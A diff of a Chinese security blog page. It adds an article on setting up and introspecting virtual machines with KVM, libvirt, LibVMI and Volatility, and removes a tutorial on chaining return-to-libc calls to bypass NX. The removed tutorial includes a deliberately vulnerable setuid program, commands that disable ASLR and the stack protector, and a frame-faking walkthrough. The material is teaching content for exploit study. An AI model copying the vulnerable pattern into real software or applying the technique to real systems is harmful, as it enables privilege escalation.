@@ -95,14 +95,6 @@
 </header>
 
 
-  <div style="background:#fff;width: 100%;">
-
-      <div style="max-height:600px; overflow: hidden;">
-        <img width="100%" alt="Hike News" src="/css/images/pose.jpg">
-      </div>
-
-  </div>
-
 
 
   <div id="container">
@@ -111,6 +103,249 @@
       <div id="content" class="outer">
         
           <section id="main">
+  
+    <article id="post-virtualizationcomprehensive"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170102/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170102/virtualizationcomprehensive/" class="article-date">
+	  <time datetime="2017-01-02T08:23:01.000Z" itemprop="datePublished">一月 2, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/03/31/virt-setup-analysis/" target="_blank" rel="external">个人博客</a>，从虚拟机的环境搭建、管理、监控到分析，介绍的内容非常全面，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟机环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 全文环境 </li>
+<li>0x02 虚拟机创建KVM/QEMU </li>
+<li>0x03 虚拟机管理Libvirt</li>
+<li>0x04 虚拟机监控Libvmi</li>
+<li>0x05 虚拟机监控Volatility</li>
+</ul>
+</blockquote>
+<p>本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控与分析。可根据自身需要阅读相关内容。</p>
+<hr>
+<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Ubuntu12.04 + Kvm-kmod-3.8 + Qemu-kvm-1.1.2+ Libvirt 1.3.2 + Libvmi + Volatility </p>
+<h3 id="Ox02-虚拟机创建KVM-QEMU"><a href="#Ox02-虚拟机创建KVM-QEMU" class="headerlink" title="Ox02 虚拟机创建KVM/QEMU"></a>Ox02 虚拟机创建KVM/QEMU</h3><p>Kvm需要CPU的支持（Intel VT 或者 AMD SVM)，在安装KVM之前，可先检查CPU是否支持硬件虚拟化技术。基于Intel的系统，可运行 ‘grep vmx /proc/cpuinfo’ 查看是否含有vmx的关键字，如果有，则表示支持；基于AMD的系统，可运行 ‘grep svm /proc/cpuinfo’ 查看是否含有svm的关键字。<br>另外，CPU若支持硬件虚拟化，还得确保BLOS开启了VT选项（有些厂商默认是禁用的，如thinkpad t450). 可以下载 cpu-checker 工具（apt-get install cpu-checker)，之后运行kvm-ok， 如果提示 kvm acceleration can not be used，则可能是blos禁用了kvm虚拟化，在blos设置中开启即可。</p>
+<p>可执行：</p>
+<pre><code>modprobe kvm 
+modprobe kvm_intel 
+</code></pre><p>开启内核自带的kvm</p>
+<p>关于源码安装kvm-kmod以及qemu-kvm的详细过程可参考 <a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">上一篇</a> 文章。kvm-kmod安装成功后，运行lsmod | grep kvm， 会显示两个module:</p>
+<pre><code>kvm_intel             137721  3 
+kvm                   415549  1 kvm_intel
+</code></pre><p>qemu-kvm安装成功后会在/your-confiure-location/bin/qemu-system-x86_64等可执行文件。</p>
+<p>安装完KVM/QEMU后，创建虚拟机的时候，虚拟机的网络方式是比较关心的问题，KVM/QEMU有两种网络配置方式。</p>
+<p>其一，用户模式（User Networking): 即NAT方式，也是默认的网络模式。让虚拟机访问主机、互联网或本地网络上的资源的简单方法，但是不能从网络或其他的客户机访问客户机。既然无法访问客户机，那宿主机与客户机该如何传输文件呢？默认的，客户机得到的ip空间为10.0.2.0/24，宿主机提供了ip为10.0.2.2的地址让虚拟机访问。可以ssh到宿主机(10.0.2.2)，用scp来拷贝文件。</p>
+<p>其二，桥接模式（Bridge Networking): 这种模式允许客户机就像一台独立的主机一样拥有网络。这种方式要比用户网络复杂一些，但是设置好后客户机与互联网，客户机与主机之间的通信都很容易。桥接网络需要网卡支持，一般的有线网卡都支持，绝大部分的无线网卡都不支持。</p>
+<p>NAT方式是KVM/QEMU提供的默认方式，要设置桥接模式，首先在宿主机上安装桥接相关的包，</p>
+<pre><code>apt-get install bridge-utils. 
+</code></pre><p>修改/etc/network/interfaces</p>
+<pre><code>auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet manual
+auto br0
+iface br0 inet dhcp
+   bridge_ports eth0
+   bridge_stp off
+   bridge_fd 9
+   bridge_hello 2
+   bridge_maxwait 0
+</code></pre><p>执行</p>
+<pre><code>/etc/init.d/networking restart
+</code></pre><p>配置好后，可运行brctl-show命令，会显示：</p>
+<pre><code>bridge name      bridge id              STP enabled interfaces
+br0              8000.68f728eddb0d      no          eth0
+                                              vnet0
+</code></pre><p>之后在创建虚拟机的时候可添加-net nic -net tap参数，如</p>
+<pre><code>/usr/local/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -net nic -net tap -monitor stdio    
+</code></pre><p>之后创建的虚拟机便工作在网桥模式中。</p>
+<h3 id="0x03-虚拟机管理Libvirt"><a href="#0x03-虚拟机管理Libvirt" class="headerlink" title="0x03 虚拟机管理Libvirt"></a>0x03 虚拟机管理Libvirt</h3><p>除了用qemu命令行的方式创建与管理虚拟机，也可将一些命令行参数保存为xml配置文件，用libvirt来管理。libvirt是一套管理虚拟机的工具，包括管理虚拟机的API、一个守护进程（libvirtd)和一个命令行工具（virsh). Libvirt 的主要目标是提供一个单一途径以管理多种不同虚拟化方案已经虚拟化主机，包括KVM/QEMU,Xen,LXC等。安装libvirt后，会产生libvirtd进程以及virsh工具，要利用libvirt做开发，可调用其中的API。libvirt, libvirtd 以及virsh的关系如下图：</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/libvirt-internal.png" alt="libvirt-internal"></p>
+<p>详细介绍可参考：<a href="http://libvirt.org/internals.html" target="_blank" rel="external">libvirt internals</a></p>
+<p>安装libvirt: </p>
+<p>先安装libvirt所依赖的包</p>
+<pre><code>apt-get install libnl-dev libxml2 libxml2-dev  libpciaccess-dev libyajl-dev libdevmapper-dev libgnutls-dev
+</code></pre><p>如出现以下错误，都可以检查上述这些包是否安装好</p>
+<pre><code>error: Could not find libxml2 anywhere
+
+error: You must install the GnuTLS library in order to compile and run libvirt
+
+error: You must install device-mapper-devel/libdevmapper &gt;= 1.0.0 to compile libvirt
+
+error: libnl-devel &gt;= 1.1 is required for macvtap support
+</code></pre><p>下载libvirt1.3.2.tar.gz</p>
+<pre><code>tar xvf libvirt1.3.2.tar.gz
+./configure
+make &amp;&amp; make install
+</code></pre><p>安装完成后，执行ldconfig同步链接库，否则会出现以下错误：</p>
+<pre><code>virsh: error while loading shared libraries: libvirt.so.0: cannot open shared object file: No such file or directory
+</code></pre><p>执行检查libvirt安装成功</p>
+<pre><code>which libvirtd
+libvirtd –version
+which virsh
+virsh –version
+</code></pre><p>若出现此类错误：</p>
+<pre><code>error: Failed to reconnect to the hypervisor
+error: no valid connection
+error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/libvirt-sock&apos;: No such file or directory
+</code></pre><p>则很有可能是libvirtd进程没有开启，这时需要手动开启libvirtd,执行libvirtd -d 即可。(libvirtd具体参数可参考：<a href="http://linux.die.net/man/8/libvirtd" target="_blank" rel="external">libvirtd manual</a> ）</p>
+<p>另外注意，libvirt从1.3版本后增加了virtlogd特性，需要执行virtlogd -d手动开启virtlogd进程（virtlogd具体参数可参看：<a href="https://www.mankier.com/8/virtlogd" target="_blank" rel="external">virtlogd manual</a> ）. 否则会出现以下错误：</p>
+<pre><code>error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/virtlogd-sock&apos;: No such file or directory
+</code></pre><p>安装好libvirt后，便可配置好xml文件，用virsh来管理。具体virsh命令这里不做介绍，可参考其中一个配置文件：</p>
+<pre><code>&lt;domain type=&apos;kvm&apos;&gt;
+&lt;name&gt;ubuntudemo&lt;/name&gt;&lt;!--虚拟机名称--&gt;
+&lt;memory&gt;1048576&lt;/memory&gt;&lt;!--最大内存，单位KB--&gt;
+&lt;currentMemory&gt;1048576&lt;/currentMemory&gt;&lt;!--可用内存，单位k--&gt;
+&lt;uuid&gt;87d5b3d2-3618-4a59-9efb-aa869ff34999&lt;/uuid&gt;
+
+&lt;vcpu&gt;1&lt;/vcpu&gt;&lt;!--虚拟cpu个数--&gt;
+&lt;os&gt;
+    &lt;type arch=&apos;x86_64&apos;,machine=&apos;pc&apos;&gt;hvm&lt;/type&gt;
+    &lt;boot dev=&apos;hd&apos;/&gt;&lt;!--光盘启动--&gt;
+&lt;/os&gt;
+&lt;features&gt;
+    &lt;acpi/&gt;
+    &lt;apic/&gt;
+    &lt;pae/&gt;
+&lt;/features&gt;
+&lt;clock offset=&apos;localtime&apos;/&gt;
+&lt;on_poweroff&gt;destroy&lt;/on_poweroff&gt;
+&lt;on_reboot&gt;restart&lt;/on_reboot&gt;
+&lt;on_crash&gt;destroy&lt;/on_crash&gt;
+&lt;devices&gt;
+    &lt;emulator&gt;/usr/bin/qemu&lt;/emulator&gt; &lt;!--先创建好软链接   ln -s /use/local/qemukvm1.1.2/bin/qemu-system-x86_64 /usr/bin/qemu--&gt;
+    &lt;disk type=&apos;file&apos; device=&apos;disk&apos;&gt;
+        &lt;driver name=&apos;qemu&apos; type=&apos;qcow2&apos;/&gt;
+        &lt;source file=&apos;/home/os.img/server12041.img&apos;/&gt;&lt;!--目的镜像路径--&gt;
+        &lt;target dev=&apos;vda&apos; bus=&apos;virtio&apos;/&gt;
+    &lt;/disk&gt;
+
+    &lt;interface type=&apos;bridge&apos;&gt;&lt;!--虚拟机网络连接方式--&gt;
+        &lt;source bridge=&apos;br0&apos;/&gt;&lt;!--当前主机网桥的名称--&gt;
+        &lt;mac address=&quot;00:16:3e:5d:aa:a8&quot;/&gt;&lt;!--为虚拟机分配mac地址，务必唯一，否则dhcp获得同样ip,引起冲突--&gt;
+    &lt;/interface&gt;
+    &lt;input type=&apos;mouse&apos; bus=&apos;ps2&apos;/&gt;
+    &lt;!--vnc方式登录，端口号自动分配，自动加1，可以通过virsh vncdisplay ubuntudemo来查询（实际端口为显示结果+5900）--&gt; 
+    &lt;graphics type=&apos;vnc&apos; port=&apos;-1&apos; autoport=&apos;yes&apos; listen=&apos;0.0.0.0&apos; keymap=&apos;en-us&apos;/&gt;
+&lt;/devices&gt;
+</code></pre><p></p>
+<h3 id="0x04-虚拟机监控Libvmi"><a href="#0x04-虚拟机监控Libvmi" class="headerlink" title="0x04 虚拟机监控Libvmi"></a>0x04 虚拟机监控Libvmi</h3><p>Libvmi是一套能从底层二进制信息重构虚拟机上层语义的C语言API。由于hypervisor(VMM)获取的全是客户机的二进制比特，用户为了从外部（比如宿主机)监控客户机的行为需要理解客户机上层的语义，比如客户机正在运行的进程列表、模块列表等信息，这种二进制到上层语义之间的gap称之为语义鸿沟（semantic gap)，从外部监控客户机的行为称之为虚拟机自省（VM Introspection）。 Libvmi提供的API，能够读取物理内存、虚拟内存、符号表（System.map）、暂停/打开虚拟机、接收内存与寄存器事件的通知等，让用户能很方便的构建插件，来读取进程列表、模块列表等信息（大部分linux原生监控工具都可以通过libvmi来构建). </p>
+<p>Libvmi目前支持Intel,AMD64以及ARM系统结构，支持的虚拟机平台包括XEN与KVM/QEMU，支持的被监控系统类型包括windows和linux. Libvmi从Xenaccess发展而来，要了解其详细原理，可参考论文<a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a>以及官方主页<a href="http://libvmi.com/" target="_blank" rel="external">libvmi</a>.</p>
+<p>安装libvmi:</p>
+<p>先安装其依赖的包，注，这里针对KVM/QEMU，关于XEN依赖的包，会有所不同，可参考<a href="http://libvmi.com/docs/gcode-install.html" target="_blank" rel="external">libvmi-installation</a></p>
+<pre><code>apt-get install automake autoconf
+apt-get install libtool
+apt-get install flex bison
+apt-get install check
+</code></pre><p>下载libvmi-0.10.1.tar.gz</p>
+<pre><code>tar xvf libvmi-0.10.1.tar.gz
+</code></pre><p>安装    </p>
+<pre><code>cd libvmi-0.10.1
+./autogen.sh
+./congfigure
+make 
+make install
+ldconfig
+</code></pre><p>libvmi提供了很多plugin examples在/libvmi/examples文件夹中，<br>要运行其中的plugin（比如process-list，列举客户机中进程信息，类似linux的原生ls命令), 首先要找出客户机符号表中的一些偏移信息. libvmi提供了获取偏移信息的工具在/libvmi/tools/linux-offset-finder/ 文件夹中，将其拷贝到虚拟机中，make编译，生成了一个内核模块findoffset.ko，执行insmod findoffset.ko将其插入内核中，<br> 再执行dmesg 将得到的偏移信息，如：</p>
+<pre><code>ostype = &quot;Linux&quot;;
+//sysmap = &quot;/boot/System.map-3.2.0-29-generic&quot;;
+linux_name = 0x470;
+linux_tasks = 0x248;
+linux_mm=0x280;
+linux_pid=0x2bc;
+linux_pgd=0x58;
+</code></pre><p>写进宿主机的/libvmi/etc/libvmi-example.conf中，将libvmi-example.conf拷贝到/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中,注，这里libvmi会在/etc/libvmi.conf或者\$HOME/etc/libvmi.conf中读取偏移信息。另外，这里的sysmap路径是host主机的路径，需要把guest中的System.map文件拷贝到host主机上。(还发现一个问题，虚拟机的名字不能全以数字命名，比如120432,不然在读取libvmi.conf配置文件时会出错).</p>
+<p>之后运行</p>
+<pre><code>/libvmi/examples/process-list ubuntudemo 
+</code></pre><p>这里ubuntudemo是创建的虚拟机名字。以下是列出的部分信息：</p>
+<pre><code>Process listing for VM ubuntudemo (id=3)
+Next list entry is at: ffff88003d638248
+[    0] swapper/0 (struct addr:ffffffff81c0d020)
+[    1] init (struct addr:ffff88003d638000)
+[    2] kthreadd (struct addr:ffff88003d639700)
+[    3] ksoftirqd/0 (struct addr:ffff88003d63ae00)
+[    6] migration/0 (struct addr:ffff88003d658000)
+[    7] watchdog/0 (struct addr:ffff88003d659700)
+[    8] cpuset (struct addr:ffff88003d65ae00)
+[    9] khelper (struct addr:ffff88003d65c500)
+[   10] kdevtmpfs (struct addr:ffff88003d65dc00)
+[   11] netns (struct addr:ffff88003d698000)
+[   12] sync_supers (struct addr:ffff88003d699700)
+</code></pre><p>Libvmi提供的plugins有限，用户可根据需要编写，也可利用取证工具volatlity做更高层次语义的分析。Libvmi支持python绑定，提供了与volatility绑定的接口，具体可见下文。</p>
+<p>###0x05 虚拟机监控Volatility  </p>
+<p>Volatility是一个用python编写的内存分析工具，与libvmi（利用sysystem.map符号表信息)不同的是，volatility利用可执行文件elf中的调试信息（dwarf格式）以及system.map符号表信息来获取更丰富的变量和函数语义。其支持windows， linux以及mac。 文中以Linux为例。</p>
+<p>Get Started:</p>
+<p>下载volatility包</p>
+<pre><code>git clone https://github.com/volatilityfoundation/volatility.git
+</code></pre><p>创建Linux profile</p>
+<p>profile是个zip文件，包含内核数据结构以及调试信息，也就是dwarf文件（volatility称之为vtypes)与system.map的压缩包。</p>
+<p>volatility提供了一个内核模块在/volatility/tools/linux文件夹下来获取vtypes信息，将文件夹内容拷贝到要分析的客户机中，编译make，生成module.dwarf文件。在此之前请确保客户机中以及安装dwarfdump (apt-get install dwarfdump）。之后执行 head module.dwarf，会显示以下内容:</p>
+<pre><code>.debug_info
+
+&lt;0&gt;&lt;0+11&gt;&lt;DW_TAG_compile_unit&gt; DW_AT_producer&lt;GNU C 4.6.3&gt; DW_AT_language&lt;DW_LANG_C89&gt;.....
+
+&lt;1&gt;&lt;45&gt;&lt;DW_TAG_typedef&gt; DW_AT_name&lt;__s8&gt; DW_AT_decl_file&lt;1 include/asm-generic/int-ll64.h&gt;.....
+</code></pre><p>生成</p>
+<p>接着将module.dwarf文件以及/boot/System.map-3.2.0-99-generic 文件（不同系统文件名不同）压缩成一个zip文件，如Ubuntu1204.zip。执行：</p>
+<pre><code>zip volatility/volatility/plugins/overlays/linux/Ubuntu1204.zip volatility/tools/linux/module.dwarf /boot/System.map-3.2.0-99-generic
+</code></pre><p>使用profile</p>
+<pre><code>python vol.py --info | grep Linux 
+</code></pre><p> 这时会显示之前创建的profile名，Linuxubuntu1204x64.</p>
+<pre><code>LinuxUbuntu1204x64    - A Profile for Linux Ubuntu1204 x64 &lt;=== This is the one we just created
+</code></pre><p>绑定libvmi的python接口</p>
+<p>在./volatility/plugins/addrspaces 有针对不同内存快照的物理地址空间，如vmware.py,lime.py，crash.py等。libvmi则提供了pyvmi接口，在/libvmi/tools/pyvmi文件夹中有个pyvmiaddressspace.py文件可供volatility使用，（若需要自己编写python程序，则需要build pyvmi，build过程可参见其中的README文件，若出现编译错误，请确保安装 apt-get install build-essentials, apt-get install python2.7-dev).<br>将pyvmiaddressspace.py文件拷贝至./volatility/plugins/addrespaces文件夹中便可以利用volatility的plugins来分析虚拟机的内存了。以linux_pslist plugin为例，执行：</p>
+<pre><code>python vol.py -l vmi://ubuntudemo --profile=Linuxubuntu1204x64 linux_pslist  
+</code></pre><p>若出现distorm3（反编译库)相关错误，请确保已经安装distorm3</p>
+<pre><code>apt-get install python-pip
+pip install distorm3
+</code></pre><p>绑定pyvmi接口后，volatility所有的plugins都可以用来分析虚拟机内存。 </p>
+<p>完</p>
+<hr>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="http://libvmi.com/" target="_blank" rel="external">Libvmi</a></p>
+<p><a href="http://libvirt.org/" target="_blank" rel="external">Libvirt</a></p>
+<p><a href="https://github.com/volatilityfoundation/volatility/wiki" target="_blank" rel="external">Volatility wiki</a></p>
+<p><a href="https://www.acsac.org/2007/papers/138.pdf" target="_blank" rel="external">Secure and Flexible Monitoring of Virtual Machines</a></p>
+<hr>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟化环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+	<span class="ico-folder"></span>
+    <a class="article-category-link" href="/categories/虚拟化综合/">虚拟化综合</a>
+
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Libvmi/">Libvmi</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Volatility/">Volatility</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
   
     <article id="post-kvmqemuintro"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
@@ -933,134 +1168,6 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
 <!-- Table of Contents -->
 
   
-    <article id="post-chainingreturntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	Posted on <a href="/20170101/chainingreturntolibc/" class="article-date">
-	  <time datetime="2017-01-01T02:39:58.000Z" itemprop="datePublished">一月 1, 2017</time>
-	</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-<hr>
-<blockquote>
-<ul>
-<li>0x01 什么Return-to-libc链接</li>
-<li>0x02 什么是帧欺骗</li>
-<li>0x03 leave ret指令是如何调用其上方libc函数的</li>
-</ul>
-</blockquote>
-<p><u>阅读基础</u>:</p>
-<ul>
-<li>1.<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
-<li>2.<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Return-to-libc绕过NX</a></li>
-</ul>
-<p><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
-<h3 id="什么是Return-to-libc链接"><a href="#什么是Return-to-libc链接" class="headerlink" title="什么是Return-to-libc链接"></a>什么是Return-to-libc链接</h3><p>在<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中可以看出，攻击者需要调用多个libc函数才能成功利用漏洞。一种链接libc函数的简单方法就是将不同libc函数依次放在栈中。但由于函数参数的原因，这是不可能的。现在你可能还不明白，没关系，继续往下读就好。</p>
-<p><u>漏洞代码</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span></div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><u>注意</u>: 上述代码和<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中的(vuln_priv.c)一样。</p>
-<p><u>编译命令</u>:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
-<p>正如<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>所说，链接seteuid,system和exit函数能允许我们利用漏洞代码”vuln”。但并没有这么简单直接，主要在于下面这两个问题：</p>
-<ul>
-<li>1.攻击者需要将两个libc函数参数或者其中一个libc函数参数与另一个libc函数地址放在栈的同一位置。显然这是不可能的(如下图所示)</li>
-<li>2.seteuid_arg必须为0.由于我们的缓冲区溢出是由strcpy操作引起的，0变成了一个不好的字符。比如，strcpy函数不会将0之后的字符拷贝到栈中。</li>
-</ul>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p>我们来看看如何解决上述两个问题。</p>
-<p><u>问题1</u>: 为解决这个问题，Nergal在<a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">phrack</a>中提出了两个聪明的技术</p>
-<ul>
-<li><ol>
-<li>ESP上升(ESP Lifting)</li>
-</ol>
-</li>
-<li><ol>
-<li>帧欺骗(Frame fakeing)</li>
-</ol>
-</li>
-</ul>
-<p>由于ESP lifting技术要求二进制文件在编译的时候不能设置帧指针(-fomit-frame-pointer)，这里我们只谈帧欺骗技术。 由于我们的二进制文件(vuln)含有帧指针，只好采用帧欺骗技术。</p>
-<h3 id="什么是帧欺骗"><a href="#什么是帧欺骗" class="headerlink" title="什么是帧欺骗"></a>什么是帧欺骗</h3><p>这项技术不去覆盖返回地址，而是直接覆盖libc函数地址(这个例子中的seteuid函数)，我们采用”leave ret”指令来覆盖。 这让攻击者有机会将函数参数存放在栈中而不必有任何交叉，而且能调用相应的libc函数，并不会带来任何问题。</p>
-<p><u>栈布局</u> 如下面栈布局所示，帧指针攻击者溢出栈并成功链接libc函数: seteuid, system与exit：</p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p>上图中红色强调的部分是”leave ret”指令调用其上方libc函数的返回地址。举个例子，第一条”leave ret”指令(位于栈地址0xbffff1fc处)调用seteuid()，第二条”leave ret”指令(位于栈地址0xbffff20c处)调用system()，第三条”leave ret”指令(位于栈地址0xbffff21c处)调用exit().</p>
-<h3 id="leave-ret指令是如何调用其上方libc函数的"><a href="#leave-ret指令是如何调用其上方libc函数的" class="headerlink" title="leave ret指令是如何调用其上方libc函数的"></a>leave ret指令是如何调用其上方libc函数的</h3><p>为了回答这个问题，首先我们要了解”leave”指令。一条”leave”指令可以翻译成:</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ebp,esp            <span class="comment">//esp = ebp</span></div><div class="line">pop ebp                <span class="comment">//ebp = *esp</span></div></pre></td></tr></table></figure>
-<p>我们来反汇编main()函数，以便更进一步了解“leave ret”指令</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">  ...</div><div class="line">  <span class="number">0x0804851c</span> &lt;+<span class="number">88</span>&gt;: leave                  <span class="comment">//mov ebp, esp; pop ebp;</span></div><div class="line">  <span class="number">0x0804851d</span> &lt;+<span class="number">89</span>&gt;: ret                    <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u>Main尾声代码</u>:</p>
-<p>如上述栈布局所示，在main函数尾声代码执行之前，攻击者已经溢出栈并用fake_ebp0(0xbffff204)覆盖了main函数的ebp，以及利用”leave ret”指令地址(0x0804851c)覆盖了其返回地址。 现在当CPU要执行main函数的尾声代码时，EIP指向text地址0x0804851c（”leave ret”)。在执行过程中，会发生下面的事情：</p>
-<ul>
-<li>‘leave’修改了下面的寄存器<ul>
-<li>esp = ebp = 0xbffff1f8</li>
-<li>ebp = 0xbffff204, esp = 0xbffff1fc</li>
-</ul>
-</li>
-<li>‘ret’执行”leave ret”指令(位于栈地址0xbffff1fc处)</li>
-</ul>
-<p><u>seteuid</u>: 现在EIP又重新指向text地址0x0804851c(“leave ret”). 在执行过程中，会发生下面的事情：</p>
-<ul>
-<li>‘leave’修改了下面的寄存器<ul>
-<li>esp = ebp = 0xbffff204</li>
-<li>ebp = 0xbffff214, esp =0xbffff208</li>
-</ul>
-</li>
-<li>‘ret’执行seteuis()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）</li>
-<li>调用seteuid()后，”leave ret”指令(位于栈地址0xbffff20c处)开始执行</li>
-</ul>
-<p>可以从上面的栈布局看出，执行上述过程，栈已经按照攻击者的意图设置好，system和exit函数都能得到执行。</p>
